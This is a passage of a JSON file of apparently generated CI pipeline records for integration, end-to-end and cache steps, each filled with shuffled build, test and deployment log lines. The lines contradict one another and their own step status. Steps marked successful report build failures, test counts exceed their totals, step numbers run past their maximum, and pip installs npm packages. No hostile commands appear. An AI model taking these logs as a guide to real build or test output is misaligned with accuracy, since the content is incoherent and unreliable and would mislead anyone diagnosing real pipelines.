          "Creating production build...",
          "Cache miss for key-2942",
          "pip install: Successfully installed lodash-5.16",
          "[12:19:03] DEBUG: Loading configuration",
          "Cache restored successfully (116MB)",
          "Artifact downloaded: 1MB",
          "pip: Installing build dependencies...",
          "Ready.",
          "npm install: resolved 1349 packages",
          "pip: Downloading express-5.17.tar.gz",
          "Time: 34.773s",
          "Coverage: 91% statements, 82% branches",
          "WARNING: webpack has known vulnerabilities",
          "Completed.",
          "Artifact downloaded: 47MB",
          "Artifact downloaded: 12MB",
          "Using Python 3.12",
          "Connection established",
          "Cache saved successfully",
          "Test Suites: 20 passed, 25 total",
          "[12:19:03] DEBUG: Loading configuration",
          "pip: Collecting react",
          "Step 6/22: Building",
          "[12:19:03] DEBUG: Loading configuration",
          "  PASS: e2e/test_db_connect.spec.js",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling components/app.ts...",
          "[12:19:03] DEBUG: Loading configuration",
          "[12:19:03] DEBUG: Initializing service",
          "Ready.",
          "FAILED: test_user_create",
          "npm notice: package.json updated",
          "\u2717 build failed with exit code 34",
          "Artifact uploaded: dist.zip (43MB)",
          "Exception: NullPointerException",
          "Step 2/24: Installing dependencies",
          "\u2717 build failed with exit code 77",
          "yarn add: Done in 6.76s",
          "Pulling image: python:latest",
          "\u2713 Step 'checkout' succeeded",
          "Cache miss for key-2473",
          "Finished.",
          "Image pulled successfully",
          "[12:19:03] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Finished.",
          "Step 5/22: Deploying",
          "Layer 9/8: RUN command",
          "Compiling components/index.js...",
          "Time: 41.968s",
          "Coverage: 99% statements, 86% branches",
          "[12:19:03] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:03] DEBUG: Connection pool: 16 active",
          "Platform: linux-x64",
          "npm notice: package.json updated",
          "Time: 71.681s",
          "Ready.",
          "\u2713 Step 'build' succeeded",
          "Ran 77 tests in 8s",
          "Image pulled successfully",
          "Cache hit for key-3211",
          "POST /data - 200 (294ms)",
          "Step 10/17: Running migrations",
          "Using Node.js 17.18.4",
          "Cache invalidated: node_modules",
          "Generating source maps...",
          "Completed.",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-26T12:21:02.650886",
        "finished_at": "2025-11-26T12:21:37.845729",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Finished.",
          "[12:19:03] INFO: Connecting to database",
          "Coverage: 85% statements, 60% branches",
          "\u2713 All checks passed",
          "Test Suites: 37 passed, 7 total",
          "Pushing to registry...",
          "\u2717 build failed with exit code 22",
          "Verifying...",
          "Artifact uploaded: dist.zip (57MB)",
          "Completed.",
          "\u2713 Task completed in 2878ms",
          "Test Suites: 26 passed, 34 total",
          "[12:19:03] DEBUG: Connection pool: 19 active",
          "[12:19:03] INFO: Starting build process",
          "Platform: linux-x64",
          "[12:19:03] WARN: Deprecated API usage",
          "yarn add: Done in 6.31s",
          "GET /api - 201 (36ms)",
          "Time: 42.435s",
          "Pushing to registry...",
          "[12:19:03] INFO: Starting build process",
          "FAILED: test_api_health",
          "Creating production build...",
          "Environment: production",
          "Using Python 3.11",
          "Time: 38.594s",
          "[12:19:03] WARN: Deprecated API usage",
          "  PASS: test_db_connect (173ms)",
          "[12:19:03] DEBUG: Loading configuration",
          "Cache saved successfully",
          "TLS handshake completed",
          "Completed.",
          "Cache invalidated: dependencies",
          "Building Docker image...",
          "\u2713 All checks passed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Installing webpack@4.11.4",
          "[12:19:03] ERROR: Connection failed",
          "Step 11/17: Running migrations",
          "Using Python 3.10",
          "[12:19:03] DEBUG: Connection pool: 17 active",
          "Pulling image: alpine:18",
          "Building Docker image...",
          "Generating source maps...",
          "HEAD is now at af8bdc8",
          "Ready.",
          "Success!",
          "yarn add: Done in 4.72s",
          "Artifact uploaded: dist.zip (28MB)",
          "POST /data - 200 (18ms)",
          "Step 16/22: Testing",
          "Optimizing 97 modules...",
          "[12:19:03] DEBUG: Query executed in 7ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "POST /data - 202 (29ms)",
          "Compiling src/handler.rs...",
          "Image pulled successfully",
          "Step 12/17: Testing",
          "Switched to branch 'hotfix/task-397'",
          "Optimizing 73 modules...",
          "Already up to date.",
          "Uploading artifact 'coverage' (15 files)",
          "Done.",
          "[12:19:03] DEBUG: Loading configuration",
          "\u2713 All checks passed",
          "  PASS: integration/test_cache_hit.spec.js",
          "Ran 54 tests in 33s",
          "Step 7/16: Deploying",
          "\u2713 validate completed",
          "\u2713 Step 'test' succeeded",
          "Platform: darwin-arm64",
          "[12:19:03] INFO: Starting build process",
          "Artifact downloaded: 25MB",
          "[12:19:03] DEBUG: Loading configuration",
          "Switched to branch 'feature/task-447'",
          "Coverage: 85% statements, 61% branches",
          "Already up to date.",
          "Minifying app.js",
          "  PASS: integration/test_auth_login.spec.js",
          "WARNING: prettier has known vulnerabilities",
          "Finished.",
          "Image pulled successfully",
          "[12:19:03] INFO: Connecting to database",
          "Cache restored successfully (31MB)",
          "Connecting to startup.dev:443...",
          "pip: Downloading react-2.4.tar.gz",
          "[12:19:03] DEBUG: Query executed in 13ms",
          "  PASS: test_db_connect (67ms)",
          "npm install: resolved 212 packages",
          "Time: 91.929s",
          "pip: Installing build dependencies...",
          "HEAD is now at 4eb3ffb",
          "GET /status - 204 (100ms)",
          "Waiting...",
          "WARNING: eslint has known vulnerabilities",
          "Generating source maps...",
          "NODE_ENV=development",
          "Cache hit for key-2853",
          "[12:19:03] INFO: Starting build process",
          "yarn add: Done in 18.31s",
          "pip: Collecting eslint",
          "Completed.",
          "Using Node.js 17.9.1",
          "Generating source maps...",
          "WARNING: express has known vulnerabilities",
          "[12:19:03] DEBUG: Memory usage: 840MB",
          "Building Docker image...",
          "Step 14/15: Installing dependencies",
          "GET /health - 201 (67ms)",
          "NODE_ENV=production",
          "Bundling vendor.js",
          "FAILED: test_db_connect",
          "[12:19:03] DEBUG: Memory usage: 1157MB",
          "Step 18/17: Building",
          "\u2717 build failed with exit code 40",
          "Installing express@5.16.10",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:19:03] DEBUG: Memory usage: 381MB",
          "[12:19:03] DEBUG: Connection pool: 16 active",
          "[12:19:03] WARN: Deprecated API usage",
          "Step 1/23: Building",
          "pip: Collecting eslint",
          "\u2713 All checks passed",
          "[12:19:03] INFO: Processing request",
          "pip: Collecting prettier",
          "[12:19:03] WARN: Deprecated API usage",
          "WARNING: eslint has known vulnerabilities",
          "Compiling utils/app.ts...",
          "Layer 7/9: COPY command",
          "Generating source maps...",
          "[12:19:03] INFO: Processing request",
          "FAILED: test_api_health",
          "Step 16/25: Running migrations",
          "[12:19:03] INFO: Connecting to database",
          "  PASS: e2e/test_auth_login.spec.js",
          "Transforming 101 files...",
          "Optimizing 38 modules...",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "Coverage: 91% statements, 78% branches",
          "pip: Downloading jest-4.9.tar.gz",
          "Step 12/17: Running migrations",
          "NODE_ENV=production",
          "Bundling main.css",
          "[12:19:03] DEBUG: Memory usage: 1838MB",
          "Checking out main branch",
          "npm notice: package.json updated",
          "Generating source maps...",
          "Checking out main branch",
          "Using Python 3.10",
          "WARNING: axios has known vulnerabilities",
          "Pulling image: alpine:18",
          "Bundling main.js",
          "Building Docker image...",
          "Snapshots: 6 passed, 11 total",
          "Using Node.js 14.0.2",
          "Step 6/17: Linting",
          "Success!",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Layer 1/12: RUN command",
          "Step 8/25: Building",
          "Time: 86.633s",
          "FAILED: test_auth_login",
          "npm install: resolved 963 packages",
          "Finished.",
          "pip: Installing build dependencies...",
          "Cache invalidated: build",
          "Processing...",
          "NODE_ENV=test",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Loading...",
          "Building Docker image...",
          "Processing...",
          "Transforming 913 files...",
          "Step 16/16: Deploying",
          "Ran 191 tests in 20s",
          "Coverage: 73% statements, 82% branches",
          "[12:19:03] ERROR: Connection failed",
          "Bundling styles.css",
          "\u2713 All checks passed",
          "Ran 156 tests in 10s",
          "Ran 192 tests in 55s",
          "Uploading artifact 'coverage' (46 files)",
          "NODE_ENV=test",
          "Connection established",
          "[12:19:03] INFO: Request completed",
          "GET /api - 204 (65ms)",
          "[12:19:03] WARN: Deprecated API usage",
          "\u2713 Task completed in 4085ms",
          "pip: Downloading jest-4.7.tar.gz",
          "yarn add: Done in 16.12s",
          "Step 10/17: Linting",
          "Transforming 481 files...",
          "HEAD is now at 3740a24",
          "[12:19:03] WARN: Deprecated API usage",
          "[12:19:03] WARN: Deprecated API usage",
          "Pushing to registry...",
          "TLS handshake completed",
          "Installing lodash@2.15.10",
          "GET /health - 200 (55ms)",
          "[12:19:03] INFO: Starting build process",
          "Connection established",
          "HEAD is now at 6ea2b18",
          "Cache restored successfully (227MB)",
          "Cache invalidated: node_modules",
          "Cache restored successfully (111MB)",
          "Cache miss for key-9805",
          "Building Docker image...",
          "pip: Downloading axios-5.11.tar.gz",
          "WARNING: webpack has known vulnerabilities",
          "Platform: win32-x64",
          "  PASS: test_auth_login (268ms)",
          "Step 13/19: Running migrations",
          "Bundling runtime.js",
          "Coverage: 81% statements, 87% branches",
          "Environment: staging",
          "\u2713 Task completed in 1102ms",
          "[12:19:03] INFO: Request completed",
          "TLS handshake completed",
          "Platform: win32-x64",
          "Cache miss for key-1488",
          "WARNING: jest has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-26T12:21:37.845729",
        "finished_at": "2025-11-26T12:21:55.443151",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "NODE_ENV=development",
          "Platform: darwin-arm64",
          "Installing axios@3.19.10",
          "\u2713 test completed",
          "Done.",
          "TLS handshake completed",
          "Finished.",
          "\u2713 Step 'setup' succeeded",
          "Compiling components/index.js...",
          "Environment: staging",
          "Uploading artifact 'build' (39 files)",
          "Artifact downloaded: 43MB",
          "Snapshots: 38 passed, 18 total",
          "Step 10/15: Building",
          "Connecting to cloud.services:443...",
          "Time: 58.380s",
          "Cache invalidated: dependencies",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:03] WARN: Deprecated API usage",
          "Finished.",
          "Connecting to test.io:443...",
          "Building Docker image...",
          "Ready.",
          "Connection established",
          "Loading...",
          "Step 3/15: Running migrations",
          "[12:19:03] DEBUG: Connection pool: 18 active",
          "[12:19:03] DEBUG: Query executed in 94ms",
          "\u2713 deploy completed",
          "\u2713 Task completed in 4961ms",
          "yarn add: Done in 17.36s",
          "\u2713 build completed",
          "[12:19:03] INFO: Request completed",
          "Bundling vendor.js",
          "  PASS: test_auth_login (420ms)",
          "npm notice: created a lockfile",
          "[12:19:03] WARN: Deprecated API usage",
          "Step 6/20: Building",
          "[12:19:03] DEBUG: Query executed in 81ms",
          "Processing...",
          "Optimizing 76 modules...",
          "Cache saved successfully",
          "Ran 43 tests in 29s",
          "Coverage: 70% statements, 89% branches",
          "Connecting to example.com:443...",
          "GET /health - 200 (10ms)",
          "Optimizing 33 modules...",
          "Building Docker image...",
          "pip: Downloading prettier-4.16.tar.gz",
          "Success!",
          "Environment: production",
          "Cache saved successfully",
          "pip: Downloading jest-4.6.tar.gz",
          "Cache saved successfully",
          "Step 4/18: Running migrations",
          "Snapshots: 31 passed, 7 total",
          "Cache miss for key-1439",
          "Image pulled successfully",
          "[12:19:03] DEBUG: Connection pool: 6 active",
          "yarn add: Done in 25.30s",
          "Transforming 130 files...",
          "[12:19:03] ERROR: Connection failed",
          "\u2717 build failed with exit code 35",
          "FAILED: test_auth_login",
          "  PASS: test_cache_hit (261ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ready.",
          "Step 11/16: Installing dependencies",
          "Artifact uploaded: dist.zip (73MB)",
          "Step 15/24: Testing",
          "npm notice: created a lockfile",
          "Using Python 3.11",
          "Environment: production",
          "pip: Downloading eslint-4.2.tar.gz",
          "Step 6/22: Building",
          "Checking out develop branch",
          "HEAD is now at 90634c4",
          "pip: Installing build dependencies...",
          "Done.",
          "[12:19:03] ERROR: Connection failed",
          "Compiling lib/handler.rs...",
          "Building Docker image...",
          "Snapshots: 15 passed, 13 total",
          "Environment: development",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache saved successfully",
          "Success!",
          "HEAD is now at 9281782",
          "[12:19:03] DEBUG: Initializing service",
          "Cache invalidated: dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:03] DEBUG: Connection pool: 13 active",
          "[12:19:03] DEBUG: Connection pool: 12 active",
          "[12:19:03] INFO: Processing request",
          "Using Python 3.11",
          "\u2713 All checks passed",
          "Pulling image: alpine:18",
          "Step 17/16: Linting",
          "[12:19:03] DEBUG: Connection pool: 14 active",
          "[12:19:03] DEBUG: Connection pool: 1 active",
          "\u2713 All checks passed",
          "Compiling utils/handler.rs...",
          "OK",
          "FAILED: test_db_connect",
          "Already up to date.",
          "\u2713 Step 'build' succeeded",
          "OK",
          "Bundling runtime.js",
          "Compiling utils/app.ts...",
          "Step 5/23: Deploying",
          "Platform: darwin-arm64",
          "Ready.",
          "[12:19:03] INFO: Request completed",
          "Time: 62.271s",
          "[12:19:03] DEBUG: Connection pool: 9 active",
          "npm install: resolved 706 packages",
          "Snapshots: 41 passed, 2 total",
          "Cache restored successfully (315MB)",
          "Cache hit for key-4097",
          "Creating production build...",
          "\u2713 Task completed in 102ms",
          "npm notice: package.json updated",
          "Snapshots: 50 passed, 45 total",
          "Generating source maps...",
          "Using Node.js 19.8.5",
          "Minifying app.js",
          "Test Suites: 13 passed, 28 total",
          "Verifying...",
          "[12:19:03] DEBUG: Initializing service",
          "pip: Collecting jest",
          "Waiting...",
          "Minifying app.js",
          "Step 12/16: Building",
          "[12:19:03] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (57MB)",
          "[12:19:03] DEBUG: Memory usage: 1060MB",
          "Cache restored successfully (455MB)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "GET /api - 200 (39ms)",
          "Connecting to test.io:443...",
          "Switched to branch 'hotfix/task-257'",
          "Step 8/23: Deploying",
          "Using Node.js 14.8.9",
          "\u2713 Step 'test' succeeded",
          "Test Suites: 17 passed, 18 total",
          "Cache restored successfully (61MB)",
          "Bundling runtime.css",
          "Image pulled successfully",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "Bundling main.css",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: dist.zip (4MB)",
          "npm notice: package.json updated",
          "OK",
          "pip: Downloading jest-4.18.tar.gz",
          "Checking out master branch",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:03] DEBUG: Connection pool: 1 active",
          "Cache saved successfully",
          "Fetching submodules...",
          "Step 2/19: Running migrations",
          "Exception: RuntimeError",
          "Time: 34.192s",
          "TLS handshake completed",
          "TLS handshake completed",
          "[12:19:03] DEBUG: Loading configuration",
          "FAILED: test_db_connect",
          "Cache saved successfully",
          "npm install: resolved 1836 packages",
          "[12:19:03] DEBUG: Query executed in 29ms",
          "Cache miss for key-3060",
          "Loading...",
          "GET /api - 201 (90ms)",
          "POST /upload - 200 (415ms)",
          "\u2713 Task completed in 3672ms",
          "HEAD is now at 39bdd49",
          "TLS handshake completed",
          "NODE_ENV=development",
          "Completed.",
          "Time: 96.508s",
          "[12:19:03] ERROR: Connection failed",
          "HEAD is now at 92a1362",
          "[12:19:03] INFO: Starting build process",
          "Checking out main branch",
          "[12:19:03] ERROR: Connection failed",
          "pip: Installing build dependencies...",
          "Uploading artifact 'coverage' (13 files)",
          "Snapshots: 23 passed, 4 total",
          "  PASS: test_api_health (146ms)",
          "Success!",
          "npm install: added 468 packages",
          "NODE_ENV=development",
          "[12:19:03] INFO: Connecting to database",
          "  PASS: unit/test_user_create.spec.js",
          "  PASS: unit/test_cache_hit.spec.js",
          "Optimizing 82 modules...",
          "Cache restored successfully (153MB)",
          "Bundling vendor.js",
          "Environment: test",
          "[12:19:03] DEBUG: Connection pool: 10 active",
          "Test Suites: 29 passed, 38 total",
          "  PASS: e2e/test_db_connect.spec.js",
          "Step 20/15: Installing dependencies",
          "Ran 13 tests in 48s",
          "yarn add: Done in 5.85s",
          "Cache hit for key-4326",
          "Environment: production",
          "Coverage: 82% statements, 99% branches",
          "npm notice: package.json updated",
          "Coverage: 86% statements, 99% branches",
          "\u2713 All checks passed",
          "Step 3/20: Linting",
          "Tests: 209 passed, 176 total",
          "Completed.",
          "Completed.",
          "\u2717 build failed with exit code 46",
          "Compiling src/service.java...",
          "TLS handshake completed",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-26T12:21:55.443151",
        "finished_at": "2025-11-26T12:22:06.001604",
        "log_lines": [
          "=== Step: save_cache ===",
          "[12:19:03] INFO: Request completed",
          "[12:19:03] ERROR: Connection failed",
          "Step 9/15: Linting",
          "Step 6/18: Linting",
          "Platform: darwin-arm64",
          "\u2713 Step 'build' succeeded",
          "[12:19:03] INFO: Cache refreshed",
          "[12:19:03] INFO: Cache refreshed",
          "[12:19:03] DEBUG: Connection pool: 7 active",
          "Compiling components/utils.go...",
          "Waiting...",
          "[12:19:03] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (41MB)",
          "[12:19:03] INFO: Cache refreshed",
          "Uploading artifact 'build' (4 files)",
          "  PASS: test_api_health (202ms)",
          "pip: Collecting prettier",
          "Installing react@3.8.5",
          "GET /health - 204 (100ms)",
          "Bundling runtime.css",
          "Transforming 456 files...",
          "Step 6/24: Running migrations",
          "[12:19:03] WARN: Deprecated API usage",
          "Tests: 103 passed, 340 total",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "Platform: darwin-arm64",
          "Ran 177 tests in 18s",
          "GET /api - 201 (93ms)",
          "Cache hit for key-3297",
          "Layer 1/10: RUN command",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: dist.zip (80MB)",
          "  PASS: test_user_create (65ms)",
          "Step 9/20: Testing",
          "Optimizing 55 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:03] DEBUG: Connection pool: 11 active",
          "[12:19:03] DEBUG: Memory usage: 214MB",
          "Test Suites: 19 passed, 24 total",
          "Connecting to cloud.services:443...",
          "Success!",
          "Fetching submodules...",
          "Waiting...",
          "Test Suites: 41 passed, 48 total",
          "Switched to branch 'hotfix/task-959'",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Optimizing 19 modules...",
          "Checking out develop branch",
          "Pulling image: node:18",
          "Uploading artifact 'build' (10 files)",
          "Completed.",
          "Step 3/20: Testing",
          "Bundling runtime.css",
          "Uploading artifact 'coverage' (28 files)",
          "WARNING: webpack has known vulnerabilities",
          "Waiting...",
          "Time: 48.223s",
          "npm install: resolved 1813 packages",
          "Time: 62.360s",
          "TLS handshake completed",
          "Snapshots: 0 passed, 5 total",
          "Compiling lib/handler.rs...",
          "Step 9/23: Linting",
          "\u2713 Task completed in 4112ms",
          "Step 8/23: Running migrations",
          "Using Node.js 14.12.5",
          "[12:19:03] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Transforming 463 files...",
          "Cache hit for key-7163",
          "OK",
          "Step 5/24: Linting",
          "Optimizing 25 modules...",
          "Coverage: 96% statements, 92% branches",
          "Cache restored successfully (430MB)",
          "Layer 6/9: COPY command",
          "TLS handshake completed",
          "[12:19:03] INFO: Request completed",
          "TLS handshake completed",
          "Compiling lib/service.java...",
          "Cache restored successfully (237MB)",
          "\u2713 All checks passed",
          "Artifact downloaded: 11MB",
          "Success!",
          "Step 1/25: Running migrations",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Success!",
          "Compiling components/utils.go...",
          "Connection established",
          "npm install: resolved 529 packages",
          "Compiling lib/handler.rs...",
          "Coverage: 81% statements, 90% branches",
          "Success!",
          "Checking out master branch",
          "[12:19:03] DEBUG: Loading configuration",
          "Uploading artifact 'build' (24 files)",
          "Connection established",
          "  PASS: test_user_create (388ms)",
          "Artifact downloaded: 10MB",
          "GET /status - 204 (75ms)",
          "Step 13/18: Installing dependencies",
          "Creating production build...",
          "Environment: test",
          "Building Docker image...",
          "Environment: development",
          "Platform: linux-x64",
          "Step 9/22: Building",
          "Coverage: 95% statements, 93% branches",
          "  PASS: test_db_connect (384ms)",
          "Artifact downloaded: 30MB",
          "Processing...",
          "Pulling image: python:3.11",
          "pip: Downloading axios-4.18.tar.gz",
          "[12:19:03] INFO: Request completed",
          "OK",
          "Transforming 749 files...",
          "Cache restored successfully (118MB)",
          "Uploading artifact 'dist' (50 files)",
          "Platform: darwin-arm64",
          "Connecting to startup.dev:443...",
          "Building Docker image...",
          "Using Node.js 20.14.2",
          "pip: Downloading eslint-2.20.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:03] DEBUG: Memory usage: 1451MB",
          "OK",
          "yarn add: Done in 21.73s",
          "Optimizing 74 modules...",
          "HEAD is now at 3435a55",
          "Cache restored successfully (47MB)",
          "[12:19:03] INFO: Cache refreshed",
          "Cache invalidated: dependencies",
          "[12:19:03] INFO: Cache refreshed",
          "Waiting...",
          "Coverage: 77% statements, 93% branches",
          "Cache restored successfully (268MB)",
          "[12:19:03] WARN: Deprecated API usage",
          "Step 7/18: Building",
          "Installing axios@3.9.10",
          "Cache hit for key-9183",
          "Bundling vendor.js",
          "Step 3/16: Testing",
          "pip install: Successfully installed webpack-1.16",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Test Suites: 44 passed, 5 total",
          "WARNING: axios has known vulnerabilities",
          "Step 15/21: Installing dependencies",
          "WARNING: jest has known vulnerabilities",
          "Compiling lib/index.js...",
          "Cache saved successfully",
          "Cache miss for key-7604",
          "Artifact uploaded: build.tar.gz (13MB)",
          "npm install: added 482 packages",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ready.",
          "[12:19:03] DEBUG: Loading configuration",
          "Step 2/24: Deploying",
          "Time: 78.783s",
          "Cache restored successfully (125MB)",
          "Exception: RuntimeError",
          "pip: Downloading express-4.17.tar.gz",
          "\u2713 Task completed in 1329ms",
          "Done.",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pulling image: python:18",
          "Cache restored successfully (261MB)",
          "npm install: resolved 1745 packages",
          "Processing...",
          "Pushing to registry...",
          "Cache invalidated: node_modules",
          "Minifying app.js",
          "Success!",
          "Already up to date.",
          "OK",
          "pip install: Successfully installed express-4.3",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Image pulled successfully",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 All checks passed",
          "Connecting to test.io:443...",
          "Snapshots: 38 passed, 27 total",
          "Cache saved successfully",
          "NODE_ENV=test",
          "Step 4/15: Installing dependencies",
          "Snapshots: 36 passed, 12 total",
          "NODE_ENV=production",
          "[12:19:03] WARN: Deprecated API usage",
          "[12:19:03] WARN: Deprecated API usage",
          "[12:19:03] INFO: Connecting to database",
          "Coverage: 83% statements, 76% branches",
          "Optimizing 35 modules...",
          "pip: Installing build dependencies...",
          "Cache miss for key-7528",
          "Checking out main branch",
          "[12:19:03] DEBUG: Query executed in 100ms",
          "[12:19:03] WARN: Deprecated API usage",
          "Cache restored successfully (72MB)",
          "Success!",
          "[12:19:03] DEBUG: Query executed in 87ms",
          "\u2713 Task completed in 2902ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Done.",
          "Image pulled successfully",
          "Platform: linux-x64",
          "Done.",
          "Exception: ValueError",
          "Using Node.js 18.14.3",
          "Generating source maps...",
          "Step 14/16: Deploying",
          "Success!",
          "Ready.",
          "Coverage: 98% statements, 66% branches",
          "Environment: production",
          "Connecting to example.com:443...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Environment: development",
          "Artifact downloaded: 5MB",
          "[12:19:03] INFO: Starting build process",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-26T12:22:06.001604",
        "finished_at": "2025-11-26T12:22:16.560057",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Compiling src/handler.rs...",
          "TLS handshake completed",
          "Success!",
          "OK",
          "\u2713 Step 'checkout' succeeded",
          "pip install: Successfully installed axios-2.7",
          "Artifact uploaded: dist.zip (78MB)",
          "Installing jest@5.16.3",
          "Verifying...",
          "Bundling main.js",
          "Connection established",
          "Success!",
          "Pushing to registry...",
          "  PASS: integration/test_api_health.spec.js",
          "Checking out develop branch",
          "pip install: Successfully installed jest-4.20",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ran 146 tests in 43s",
          "[12:19:03] DEBUG: Connection pool: 11 active",
          "Step 7/25: Installing dependencies",
          "pip: Installing build dependencies...",
          "Time: 71.622s",
          "[12:19:03] INFO: Request completed",
          "Success!",
          "Step 5/25: Building",
          "[12:19:03] DEBUG: Initializing service",
          "Step 13/16: Running migrations",
          "Using Python 3.9",
          "Using Node.js 19.7.8",
          "Step 20/19: Running migrations",
          "WARNING: prettier has known vulnerabilities",
          "[12:19:03] ERROR: Connection failed",
          "TLS handshake completed",
          "\u2713 Step 'checkout' succeeded",
          "Already up to date.",
          "Step 20/19: Linting",
          "Waiting...",
          "Compiling lib/main.py...",
          "Switched to branch 'bugfix/task-211'",
          "Step 3/22: Deploying",
          "[12:19:03] WARN: Deprecated API usage",
          "Compiling lib/app.ts...",
          "[12:19:03] DEBUG: Memory usage: 175MB",
          "Installing express@3.9.8",
          "  PASS: e2e/test_db_connect.spec.js",
          "Image pulled successfully",
          "[12:19:03] INFO: Cache refreshed",
          "Fetching submodules...",
          "[12:19:03] ERROR: Connection failed",
          "Step 11/24: Testing",
          "npm install: resolved 437 packages",
          "Creating production build...",
          "Installing webpack@1.19.9",
          "\u2713 Task completed in 4453ms",
          "  PASS: unit/test_api_health.spec.js",
          "Step 12/22: Installing dependencies",
          "Switched to branch 'feature/task-234'",
          "Platform: win32-x64",
          "\u2713 build completed",
          "Pushing to registry...",
          "OK",
          "Connection established",
          "Already up to date.",
          "Layer 9/10: COPY command",
          "\u2713 All checks passed",
          "Cache miss for key-5783",
          "Step 8/19: Installing dependencies",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:03] WARN: Deprecated API usage",
          "Step 17/25: Building",
          "Compiling utils/main.py...",
          "Step 6/25: Testing",
          "Uploading artifact 'coverage' (25 files)",
          "Switched to branch 'bugfix/task-790'",
          "Switched to branch 'bugfix/task-558'",
          "[12:19:03] DEBUG: Loading configuration",
          "Compiling utils/handler.rs...",
          "Verifying...",
          "Environment: test",
          "pip: Collecting axios",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Uploading artifact 'dist' (22 files)",
          "FAILED: test_user_create",
          "GET /status - 204 (59ms)",
          "OK",
          "pip: Installing build dependencies...",
          "HEAD is now at 6bee4d8",
          "Exception: TypeError",
          "Bundling vendor.js",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Cache hit for key-8244",
          "Environment: staging",
          "Tests: 215 passed, 274 total",
          "[12:19:03] DEBUG: Memory usage: 382MB",
          "npm notice: created a lockfile",
          "Waiting...",
          "Step 13/24: Testing",
          "Step 11/23: Running migrations",
          "Building Docker image...",
          "Test Suites: 35 passed, 46 total",
          "HEAD is now at 8b7a663",
          "\u2713 lint completed",
          "Cache hit for key-3807",
          "[12:19:03] INFO: Connecting to database",
          "Artifact uploaded: dist.zip (20MB)",
          "Minifying app.js",
          "[12:19:03] INFO: Processing request",
          "Bundling styles.css",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "OK",
          "Minifying main.js",
          "Using Node.js 17.20.8",
          "Loading...",
          "pip: Downloading jest-3.18.tar.gz",
          "\u2713 All checks passed",
          "Loading...",
          "Processing...",
          "Finished.",
          "Coverage: 81% statements, 68% branches",
          "Checking out main branch",
          "Verifying...",
          "npm install: added 332 packages",
          "npm install: added 334 packages",
          "[12:19:03] INFO: Connecting to database",
          "Cache hit for key-6018",
          "[12:19:03] DEBUG: Query executed in 78ms",
          "Compiling utils/app.ts...",
          "Step 1/17: Installing dependencies",
          "[12:19:03] DEBUG: Query executed in 54ms",
          "pip: Collecting eslint",
          "[12:19:03] INFO: Connecting to database",
          "Minifying app.js",
          "Time: 61.411s",
          "Coverage: 95% statements, 85% branches",
          "Processing...",
          "Coverage: 80% statements, 94% branches",
          "[12:19:03] WARN: Deprecated API usage",
          "Cache miss for key-5214",
          "Waiting...",
          "Minifying vendor.js",
          "HEAD is now at 977b893",
          "Verifying...",
          "Uploading artifact 'coverage' (49 files)",
          "Tests: 89 passed, 318 total",
          "\u2713 Step 'setup' succeeded",
          "Building Docker image...",
          "FAILED: test_auth_login",
          "Pulling image: node:latest",
          "Platform: win32-x64",
          "Ready.",
          "Already up to date.",
          "Coverage: 95% statements, 76% branches",
